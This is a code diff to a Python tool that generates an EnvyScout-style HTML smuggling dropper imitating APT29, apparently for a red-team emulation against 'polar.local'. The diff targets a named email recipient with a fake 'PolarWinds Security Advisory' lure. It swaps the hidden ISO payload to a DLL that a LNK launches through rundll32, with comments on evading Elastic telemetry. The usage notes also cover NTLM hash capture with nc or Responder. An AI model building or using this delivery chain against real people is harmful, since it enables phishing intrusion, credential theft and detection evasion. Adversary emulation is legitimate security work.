@@ -6,7 +6,8 @@ Version : 1.0
 
 PURPOSE
 -------
-Generates a complete EnvyScout-style HTML smuggler (NV.html).
+Generates a complete EnvyScout-style HTML smuggler (NV.html) for the
+cozy-bear-emulation adversary emulation engagement against polar.local.
 
 The HTML dropper implements all four documented EnvyScout components
 attributed to NOBELIUM (APT29) by MSTIC:
@@ -36,7 +37,7 @@ USAGE
       --lure-title "PolarWinds Security Advisory 2026-Q1" \
       --iso-name "PolarWinds-Advisory.img"
 
-  # Step 3: Serve / email NV.html to {target@domain.com} - sending from same domain will let Outlook strip MOTW.
+  # Step 3: Serve / email NV.html to r.mcdonald@polar.local
   # NTLM capture: nc -lvnp 445 or Responder on Kali tun0
 
 PRIMARY SOURCES
@@ -149,14 +150,14 @@ def build_iso(payload_bytes: bytes, lure_name: str, iso_output_path: str) -> boo
         hidden_dir.mkdir()
 
         # Write payload DLL into hidden dir
-        payload_path = hidden_dir / "payload.exe"
+        payload_path = hidden_dir / "payload.dll"
         payload_path.write_bytes(payload_bytes)
 
         # Path is relative to ISO mount point (e.g. D:\)
         # Using cmd /c for indirect execution — reduces direct rundll32 parent
         # process correlation in Elastic telemetry
         # change LNK command  
-        target_cmd = '/c for %d in (D E F G H I) do if exist %d:\\NV\\payload.exe start /B %d:\\NV\\payload.exe'
+        target_cmd = '/c for %d in (D E F G H I) do if exist %d:\\NV\\payload.dll rundll32.exe %d:\\NV\\payload.dll, RunNotepad'
         lnk_bytes = build_lnk(target_cmd, lure_name, r'C:\Windows\System32')
 
         lnk_path = tmp / f"{lure_name}.lnk"
